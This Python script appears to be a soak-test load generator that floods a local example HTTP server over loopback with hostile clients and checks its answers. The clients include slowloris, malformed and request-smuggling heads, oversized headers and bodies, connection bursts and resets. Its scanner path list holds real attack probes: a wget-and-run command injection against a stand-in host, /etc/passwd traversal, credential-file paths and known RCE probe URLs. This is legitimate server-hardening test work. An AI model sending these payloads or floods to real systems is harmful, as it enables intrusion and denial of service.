#!/usr/bin/env python3
"""Hostile load on examples/httpd for a soak run: the clients a public
port 80 meets, all at once, from one asyncio loop.

  canary     GET /, /stats and /static/style.css on one kept-alive
             connection, at --canary-rate; the answers are checked and
             the whole exchange timed (canary_*)
  scanner    a GET (now and then HEAD, POST, OPTIONS, PROPFIND) of a path
             from a scanner's list, absolute-form targets included; any
             4xx is right, but a GET or HEAD of / (with a query) is a 200
  malformed  a request head std/http must reject: a bad request line or
             header, control bytes, bare LFs, a bad version, a transfer
             coding it doesn't do, smuggling shapes; 400, 501 or 505
  garbage    random bytes, up to 8 KB in up to 4 writes, then a close
  bighead    a 1 MB header, every --bighead-s seconds; 431 or a close
  bodies     a body past max_body (Content-Length or chunked), or chunked
             framing that is wrong; 413 or 400
  pipeline   200 GETs of / in one write on a kept-alive connection; all
             200 answers must come back, in order
  nonreader  5,000 pipelined GETs it never reads, held for 30 s, so the
             server's writes time out
  slowloris  --slowloris clients sending a request head a byte a second
             until the server's request timeout ends them, then again
  idle       --idle connections from --idle-ips addresses that never send,
             reopened when the server's idle timeout closes them
  crowd      --crowd connections from one address that never send: the
             server's per-IP cap refuses all but its first ones with a
             503; each refused one tries again a second later
  burst      every --burst-every-s seconds, --burst connections at once
             from many addresses, held 5 s: past the server's
             max_connections, the rest are refused with a 503 (the
             first burst one period in, after the idle ones have opened)
  resets     connect, then reset at once (SO_LINGER 0)
  halfclose  a GET, then shutdown(SHUT_WR); the answer must come back and
             the server must close

The clients come from loopback addresses: the canary, scanners,
malformed, pipeline, halfclose and the probe from 127.0.0.1, the others
from addresses of their own (127.0.0.2 and up, which Linux routes
without setup; macOS needs `ifconfig lo0 alias` for each, so there
--one-ip sends everything from 127.0.0.1 and the server needs its
per-IP cap out of the way). The burst passes max_connections for a few
seconds: a canary or probe refused then (with a 503, or a reset before
it could be read) is counted in `refused_during_burst`, not as an
error.

These count as errors: a connect that fails or times out; a canary,
scanner, malformed request, pipeline or half-closed client that gets no
answer, a wrong one, or a close before it; a half-closed client the
server doesn't close within 30 s; a 503 outside a burst. The other
clients' I/O errors are the server's caps and timeouts cutting them
off, and are only counted, in the io_* columns.

Writes one CSV row per --sample-s interval (see soaklib.run).
"""

import argparse
import asyncio
import json
import random
import socket
import struct
import threading
import time

import soaklib

TIMEOUT = 30.0
# The clients whose every I/O error is an error of the server's.
STRICT = {"canary", "scanner", "malformed", "pipeline", "halfclose"}
NONREADER_HOLD_S = 30
BURST_HOLD_S = 5

SCAN_PATHS = [
    "/.env", "/.git/config", "/wp-login.php", "/wp-admin/setup-config.php", "/xmlrpc.php",
    "/phpmyadmin/index.php", "/admin", "/login", "/config.json", "/server-status",
    "/cgi-bin/luci/;stok=/locale", "/boaform/admin/formLogin", "/HNAP1/", "/actuator/health",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/solr/admin/info/system",
    "/.aws/credentials", "/owa/auth/logon.aspx", "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
    "/?XDEBUG_SESSION_START=phpstorm", "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array",
    "/shell?cd+/tmp;rm+-rf+*;wget+http://203.0.113.9/jaws;sh+/tmp/jaws", "/static/../../etc/passwd",
    "/static/%2e%2e/%2e%2e/etc/passwd", "/static/", "/favicon.ico", "/robots.txt", "/sitemap.xml",
    "/%00", "/" + "A" * 3000, "/stats/x", "/ /x",
]
AGENTS = ["Mozilla/5.0 zgrab/0.x", "python-requests/2.31", "curl/7.88.1", "Go-http-client/1.1",
          "Mozilla/5.0 (compatible; CensysInspect/1.1)", "masscan/1.3", "", "\xff\xfe" * 20]

# Complete heads std/http must reject, and how.
MALFORMED = [
    (b"GET\r\n\r\n", 400),
    (b"GET / HTTP/1.1 extra\r\nHost: x\r\n\r\n", 400),
    (b"GET / HTTP/2.0\r\nHost: x\r\n\r\n", 505),
    (b"GET / HTTP/9.9\r\nHost: x\r\n\r\n", 505),
    (b"GET / FOO/1.1\r\nHost: x\r\n\r\n", 400),
    (b"GET / HTTP/1.1\r\nHost x\r\n\r\n", 400),
    (b"GET / HTTP/1.1\r\nBad Name: x\r\n\r\n", 400),
    (b"GET / HTTP/1.1\nHost: x\n\n", 400),
    (b"GET / HTTP/1.1\r\nHost: a\rb\r\n\r\n", 400),
    (b"GET / HTTP/1.1\r\nX: \x01\x02\r\n\r\n", 400),
    (b"GET /\x00 HTTP/1.1\r\nHost: x\r\n\r\n", 400),
    (b"POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n", 400),
    (b"POST / HTTP/1.1\r\nHost: x\r\nContent-Length: -1\r\n\r\n", 400),
    (b"POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 1e3\r\n\r\n", 400),
    (b"POST / HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: gzip, chunked\r\n\r\n", 501),
    (b"POST / HTTP/1.0\r\nHost: x\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n", 400),
    (b"\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03" + b"\x00" * 32 + b"\r\n\r\n", 400),
    (b"SSH-2.0-OpenSSH_9.6\r\n\r\n", 400),
]


class ConnectFailed(Exception):
    """A connect that failed, already logged as an error."""


class Refused(Exception):
    """A 503 from the server's connection caps."""


class Load:
    def __init__(self, args, stats, err, stop):
        self.args, self.stats, self.err, self.stop = args, stats, err, stop
        self.rng = random.Random(args.seed)
        self.burst_until = 0.0

    # ── plumbing ──

    def source(self, n):
        """Loopback address number `n` (0 and up), never 127.0.0.1; None
        with --one-ip."""
        if self.args.one_ip:
            return None
        return f"127.0.{n // 250}.{n % 250 + 2}"

    async def connect(self, src=None):
        try:
            return await asyncio.wait_for(asyncio.open_connection(
                self.args.host, self.args.port,
                local_addr=None if src is None else (src, 0)), TIMEOUT)
        except (OSError, asyncio.TimeoutError) as e:
            self.err("connect", f"{type(e).__name__}: {e}")
            raise ConnectFailed() from e

    async def raw_socket(self, src=None, rcvbuf=None):
        s = socket.socket()
        if rcvbuf is not None:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, rcvbuf)
        s.setblocking(False)
        try:
            if src is not None:
                s.bind((src, 0))
            await asyncio.wait_for(asyncio.get_running_loop().sock_connect(
                s, (self.args.host, self.args.port)), TIMEOUT)
        except (OSError, asyncio.TimeoutError) as e:
            s.close()
            self.err("connect", f"{type(e).__name__}: {e}")
            raise ConnectFailed() from e
        return s

    def in_burst(self):
        return time.monotonic() < self.burst_until + 1.0

    async def response(self, r, head_only=False):
        """Reads one response: (status, headers, body). Raises
        IncompleteReadError when the server closes first, Refused on a 503."""
        line = await asyncio.wait_for(r.readuntil(b"\r\n"), TIMEOUT)
        parts = line.split(b" ", 2)
        if len(parts) < 2 or not parts[0].startswith(b"HTTP/1.1"):
            raise ValueError(f"bad status line {line[:100]!r}")
        status = int(parts[1])
        headers = {}
        while True:
            h = await asyncio.wait_for(r.readuntil(b"\r\n"), TIMEOUT)
            if h == b"\r\n":
                break
            k, _, v = h.decode("latin-1").partition(":")
            headers[k.strip().lower()] = v.strip()
        n = 0 if head_only else int(headers.get("content-length", "0"))
        body = await asyncio.wait_for(r.readexactly(n), TIMEOUT) if n else b""
        if status == 503:
            raise Refused()
        return status, headers, body

    def stopped(self):
        return self.stop.is_set()

    async def paced(self, rate, fn, name, first_after=False):
        """Starts `fn()` `rate` times a second, each in its own task; the
        first one at once, or one period in with `first_after`."""
        if rate <= 0:
            return
        period = 1.0 / rate
        nxt = time.monotonic()
        if first_after:
            nxt += period
            await asyncio.sleep(period)
        tasks = set()
        while not self.stopped():
            nxt += period
            t = asyncio.create_task(self.guard(fn, name))
            tasks.add(t)
            t.add_done_callback(tasks.discard)
            await asyncio.sleep(max(0.0, nxt - time.monotonic()))
        for t in list(tasks):
            t.cancel()

    async def guard(self, fn, name):
        try:
            await fn()
        except asyncio.CancelledError:
            raise
        except ConnectFailed:
            pass
        except Refused:
            if name in STRICT and not self.in_burst():
                self.err("refused", f"{name}: 503 outside a burst")
            else:
                self.stats.add("refused_during_burst" if name in STRICT else f"refused_{name}")
        except (OSError, asyncio.IncompleteReadError, asyncio.TimeoutError, ValueError) as e:
            if name in STRICT and self.in_burst() and not isinstance(e, ValueError):
                # A refusal that reset the connection before its 503 was read.
                self.stats.add("refused_during_burst")
            elif name in STRICT:
                self.err("io", f"{name}: {type(e).__name__}: {e}")
            else:
                self.stats.add(f"io_{name}")
        except Exception as e:  # a bug in the load, not the server
            self.err("load", f"{name}: {type(e).__name__}: {e}")

    async def forever(self, fn, name, pause=0.1):
        """Runs `fn()` again and again until the end of the run."""
        while not self.stopped():
            await self.guard(fn, name)
            await asyncio.sleep(pause)

    # ── the clients ──

    async def canary(self):
        t0 = time.monotonic()
        r, w = await self.connect()
        try:
            w.write(b"GET / HTTP/1.1\r\nHost: soak\r\nUser-Agent: canary\r\n\r\n"
                    b"GET /stats HTTP/1.1\r\nHost: soak\r\n\r\n"
                    b"GET /static/style.css HTTP/1.1\r\nHost: soak\r\nConnection: close\r\n\r\n")
            status, _, body = await self.response(r)
            if status != 200 or b"<title>Gem</title>" not in body:
                self.err("verify", f"canary: / gave {status} {body[:100]!r}")
                return
            status, headers, body = await self.response(r)
            stats = json.loads(body) if status == 200 else None
            if not isinstance(stats, dict) or "requests" not in stats:
                self.err("verify", f"canary: /stats gave {status} {body[:200]!r}")
                return
            status, headers, body = await self.response(r)
            if status != 200 or not headers.get("content-type", "").startswith("text/css"):
                self.err("verify", f"canary: style.css gave {status} {headers}")
                return
            if await asyncio.wait_for(r.read(), TIMEOUT):
                self.err("verify", "canary: bytes after the last response")
                return
            self.stats.latency(time.monotonic() - t0, "canary")
            self.stats.add("canaries")
        finally:
            w.close()

    async def scanner(self):
        r, w = await self.connect()
        try:
            method = self.rng.choice(["GET"] * 6 + ["HEAD", "POST", "OPTIONS", "PROPFIND"])
            path = self.rng.choice(SCAN_PATHS)
            target = f"http://{self.rng.choice(['203.0.113.7', 'example.com'])}{path}" \
                if self.rng.random() < 0.1 else path
            body = b"a=1" if method == "POST" else b""
            head = (f"{method} {target} HTTP/1.1\r\nHost: 203.0.113.7\r\nUser-Agent: "
                    f"{self.rng.choice(AGENTS)}\r\nAccept: */*\r\nConnection: close\r\n"
                    + (f"Content-Length: {len(body)}\r\n" if body else "") + "\r\n")
            w.write(head.encode("latin-1") + body)
            status, _, _ = await self.response(r, head_only=method == "HEAD")
            root = path.split("?")[0] == "/" and method in ("GET", "HEAD")
            if status != 200 if root else not 400 <= status < 500:
                self.err("verify", f"scanner: {method} {target[:200]!r} gave {status}")
                return
            self.stats.add("scans")
        finally:
            w.close()

    async def malformed(self):
        r, w = await self.connect()
        try:
            head, want = self.rng.choice(MALFORMED)
            w.write(head)
            status, _, _ = await self.response(r)
            if status != want:
                self.err("verify", f"malformed: {head[:80]!r} gave {status}, want {want}")
                return
            self.stats.add("malformed")
        finally:
            w.close()

    async def garbage(self):
        r, w = await self.connect(self.source(1))
        try:
            for _ in range(self.rng.randint(1, 4)):
                w.write(self.rng.randbytes(self.rng.randint(1, 2048)))
                await w.drain()
            await self.drain_for(r, 0.5)
            self.stats.add("garbage")
        finally:
            w.close()

    async def drain_for(self, r, seconds):
        """Reads until the server closes or `seconds` pass; what was read."""
        end = time.monotonic() + seconds
        got = b""
        while time.monotonic() < end:
            try:
                chunk = await asyncio.wait_for(r.read(65536), end - time.monotonic())
            except asyncio.TimeoutError:
                break
            if not chunk:
                break
            got += chunk
        return got

    async def bighead(self):
        r, w = await self.connect(self.source(2))
        try:
            w.write(b"GET / HTTP/1.1\r\nHost: x\r\nX-Big: ")
            filler = b"a" * 65536
            try:
                for _ in range(16):
                    w.write(filler)
                    await asyncio.wait_for(w.drain(), TIMEOUT)
                w.write(b"\r\n\r\n")
                await w.drain()
            except ConnectionError:
                pass  # the server answered 431 and closed while we sent
            got = await self.drain_for(r, 5.0)
            if got.startswith(b"HTTP/1.1 503 "):
                raise Refused()
            if got and not got.startswith(b"HTTP/1.1 431 "):
                self.err("verify", f"bighead: got {got[:100]!r}")
                return
            self.stats.add("bigheads")
        finally:
            w.close()

    async def bodies(self):
        r, w = await self.connect(self.source(3))
        try:
            kind = self.rng.randrange(3)
            if kind == 0:
                w.write(b"POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 1000000\r\n\r\n" + b"x" * 200_000)
                want = b"HTTP/1.1 413 "
            elif kind == 1:
                chunk = b"10000\r\n" + b"y" * 65536 + b"\r\n"
                w.write(b"POST / HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n\r\n" + chunk * 3)
                want = b"HTTP/1.1 413 "
            else:
                w.write(b"POST / HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nabcdefgh\r\n0\r\n\r\n")
                want = b"HTTP/1.1 400 "
            try:
                await asyncio.wait_for(w.drain(), TIMEOUT)
            except ConnectionError:
                pass
            got = await self.drain_for(r, 5.0)
            if got.startswith(b"HTTP/1.1 503 "):
                raise Refused()
            if got and not got.startswith(want):
                self.err("verify", f"bodies: got {got[:100]!r}, want {want!r}")
                return
            self.stats.add("bodies")
        finally:
            w.close()

    async def pipeline(self):
        r, w = await self.connect()
        try:
            n = 200
            w.write(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n" * (n - 1)
                    + b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
            for i in range(n):
                status, _, body = await self.response(r)
                if status != 200 or b"<title>Gem</title>" not in body:
                    self.err("verify", f"pipeline: answer {i} was {status}")
                    return
            self.stats.add("pipelines")
        finally:
            w.close()

    async def nonreader(self):
        s = await self.raw_socket(self.source(4), rcvbuf=4096)
        try:
            try:
                await asyncio.wait_for(asyncio.get_running_loop().sock_sendall(
                    s, b"GET / HTTP/1.1\r\nHost: x\r\n\r\n" * 5000), NONREADER_HOLD_S)
            except (asyncio.TimeoutError, ConnectionError):
                pass  # the server stopped reading, or has closed
            end = time.monotonic() + NONREADER_HOLD_S
            while not self.stopped() and time.monotonic() < end:
                await asyncio.sleep(1.0)
            self.stats.add("nonreaders")
        finally:
            s.close()

    async def slowloris(self, i):
        r, w = await self.connect(self.source(10 + i % 20))
        try:
            head = b"GET / HTTP/1.1\r\nHost: x\r\nUser-Agent: slow\r\n" + b"X-a: b\r\n" * 1000
            reader = asyncio.create_task(r.read())  # ends when the server closes
            k = 0
            while not self.stopped() and not reader.done() and k < len(head):
                w.write(head[k:k + 1])
                k += 1
                await asyncio.wait([reader], timeout=1.0)
            reader.cancel()
            self.stats.add("slowloris_done")
        finally:
            w.close()

    async def hold(self, src, counter):
        """A connection that never sends, held until the server closes it."""
        r, w = await self.connect(src)
        try:
            self.stats.add(counter)
            while not self.stopped():
                try:
                    got = await asyncio.wait_for(r.read(4096), 1.0)
                except asyncio.TimeoutError:
                    continue
                if got.startswith(b"HTTP/1.1 503 "):
                    raise Refused()
                if not got:
                    return  # the server's idle timeout
        finally:
            w.close()

    async def burst(self):
        self.burst_until = float("inf")
        conns = []

        async def one(i):
            try:
                conns.append(await asyncio.open_connection(
                    self.args.host, self.args.port,
                    local_addr=None if self.args.one_ip else (self.source(100 + i % 200), 0)))
            except OSError:
                self.stats.add("io_burst")

        await asyncio.gather(*(one(i) for i in range(self.args.burst)))
        self.stats.add("burst_conns", len(conns))
        await asyncio.sleep(BURST_HOLD_S)

        async def refused(r):
            try:
                return (await asyncio.wait_for(r.read(32), 0.5)).startswith(b"HTTP/1.1 503 ")
            except (asyncio.TimeoutError, OSError):
                return False

        answers = await asyncio.gather(*(refused(r) for r, _ in conns))
        for _, w in conns:
            w.close()
        self.burst_until = time.monotonic()
        self.stats.add("burst_refused", sum(answers))

    async def reset(self):
        s = await self.raw_socket(self.source(5))
        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
        s.close()
        self.stats.add("resets")

    async def halfclose(self):
        r, w = await self.connect()
        try:
            w.write(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
            await w.drain()
            w.write_eof()
            status, _, _ = await self.response(r)
            if status != 200:
                self.err("verify", f"halfclose: got {status}")
                return
            try:
                if await asyncio.wait_for(r.read(), TIMEOUT):
                    self.err("verify", "halfclose: bytes after the response")
                    return
            except asyncio.TimeoutError:
                self.err("verify", f"halfclose: the server kept the connection {TIMEOUT:.0f} s")
                return
            self.stats.add("halfcloses")
        finally:
            w.close()

    async def main(self):
        a = self.args
        jobs = [
            self.paced(a.canary_rate, self.canary, "canary"),
            self.paced(a.scanner_rate, self.scanner, "scanner"),
            self.paced(a.malformed_rate, self.malformed, "malformed"),
            self.paced(a.garbage_rate, self.garbage, "garbage"),
            self.paced(1.0 / a.bighead_s if a.bighead_s > 0 else 0, self.bighead, "bighead"),
            self.paced(a.body_rate, self.bodies, "bodies"),
            self.paced(a.pipeline_rate, self.pipeline, "pipeline"),
            self.paced(a.nonreader_rate, self.nonreader, "nonreader"),
            self.paced(a.reset_rate, self.reset, "reset"),
            self.paced(a.halfclose_rate, self.halfclose, "halfclose"),
            self.paced(1.0 / a.burst_every_s if a.burst > 0 and a.burst_every_s > 0 else 0,
                       self.burst, "burst", first_after=True),
        ]
        jobs += [self.forever(lambda i=i: self.slowloris(i), "slowloris") for i in range(a.slowloris)]
        jobs += [self.forever(lambda: self.hold(self.source(400), "crowd_opened"), "crowd", pause=1.0)
                 for _ in range(a.crowd)]
        tasks = [asyncio.create_task(j) for j in jobs]
        # The idle connections open over --ramp-s, so the accept queue isn't
        # flooded at the start.
        for i in range(a.idle):
            if self.stopped():
                break
            src = self.source(500 + i % max(1, a.idle_ips))
            tasks.append(asyncio.create_task(self.forever(
                lambda src=src: self.hold(src, "idle_opened"), "idle")))
            await asyncio.sleep(a.ramp_s / max(1, a.idle))
        while not self.stopped():
            await asyncio.sleep(0.2)
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)


class LoopThread(threading.Thread):
    def __init__(self, load):
        super().__init__(name="asyncio")
        self.load = load

    def run(self):
        try:
            asyncio.run(self.load.main())
        except Exception as e:
            self.load.err("load", f"{type(e).__name__}: {e}")


CLIENTS = ("canary", "scanner", "malformed", "garbage", "bighead", "bodies", "pipeline",
           "nonreader", "slowloris", "idle", "crowd", "burst", "reset", "halfclose")
COUNTS = ["canaries", "scans", "malformed", "garbage", "bigheads", "bodies", "pipelines",
          "nonreaders", "slowloris_done", "idle_opened", "crowd_opened", "refused_crowd",
          "burst_conns", "burst_refused", "refused_during_burst", "resets", "halfcloses"]
COLUMNS = (["t", "elapsed_s", "interval_s"] + COUNTS
           + ["canary_n", "canary_p50_ms", "canary_p99_ms", "canary_max_ms", "errors",
              "err_refused", "err_verify", "err_connect", "err_io", "err_load", "probe_ms",
              "probe_error"]
           + [f"io_{n}" for n in CLIENTS])


def loopback_aliases():
    """Whether this machine routes 127.0.0.2 to loopback (Linux does)."""
    s = socket.socket()
    try:
        s.bind(("127.0.0.2", 0))
        return True
    except OSError:
        return False
    finally:
        s.close()


def main():
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    soaklib.common_args(p, 8080)
    p.add_argument("--canary-rate", type=float, default=2, help="canary exchanges/s")
    p.add_argument("--scanner-rate", type=float, default=20, help="scanner requests/s")
    p.add_argument("--malformed-rate", type=float, default=5, help="malformed heads/s")
    p.add_argument("--garbage-rate", type=float, default=5, help="random-byte connections/s")
    p.add_argument("--bighead-s", type=float, default=10, help="seconds between 1 MB headers (0: none)")
    p.add_argument("--body-rate", type=float, default=1, help="oversized or misframed bodies/s")
    p.add_argument("--pipeline-rate", type=float, default=1, help="200-request pipelines/s")
    p.add_argument("--nonreader-rate", type=float, default=0.2, help="clients that never read/s")
    p.add_argument("--reset-rate", type=float, default=20, help="connect-and-reset/s")
    p.add_argument("--halfclose-rate", type=float, default=2, help="half-closed requests/s")
    p.add_argument("--slowloris", type=int, default=50, help="clients sending a byte a second")
    p.add_argument("--idle", type=int, default=600, help="idle connections held open")
    p.add_argument("--idle-ips", type=int, default=60, help="addresses the idle ones come from")
    p.add_argument("--crowd", type=int, default=100, help="idle connections from one address")
    p.add_argument("--burst", type=int, default=1200, help="connections opened at once per burst (0: none)")
    p.add_argument("--burst-every-s", type=float, default=120, help="seconds between bursts")
    p.add_argument("--ramp-s", type=float, default=20, help="seconds to open the idle ones")
    p.add_argument("--one-ip", action="store_true",
                   help="every client from 127.0.0.1 (automatic where 127.0.0.2 isn't loopback)")
    args = p.parse_args()
    if not args.one_ip and not loopback_aliases():
        print("httpd_load: 127.0.0.2 is not a loopback address here: every client comes "
              "from 127.0.0.1 (--one-ip)", flush=True)
        args.one_ip = True

    stats = soaklib.Stats(("canary",))
    err = soaklib.ErrorLog(args.errors, stats)
    stop = threading.Event()
    load = Load(args, stats, err, stop)

    def sample_extra():
        """A new connection's GET /stats, timed: the server's answer, with
        a recorder round trip, under the load. A 503 during a burst is
        not timed."""
        t0 = time.monotonic()
        with socket.create_connection((args.host, args.port), TIMEOUT) as s:
            s.settimeout(TIMEOUT)
            s.sendall(b"GET /stats HTTP/1.1\r\nHost: probe\r\nConnection: close\r\n\r\n")
            buf = b""
            while True:
                chunk = s.recv(65536)
                if not chunk:
                    break
                buf += chunk
        if buf.startswith(b"HTTP/1.1 503 ") and load.in_burst():
            return {}
        if not buf.startswith(b"HTTP/1.1 200 "):
            raise ConnectionError(f"probe got {buf[:60]!r}")
        return {"probe_ms": (time.monotonic() - t0) * 1000}

    soaklib.run(args, stats, COLUMNS, sample_extra, [LoopThread(load)], stop)


if __name__ == "__main__":
    main()
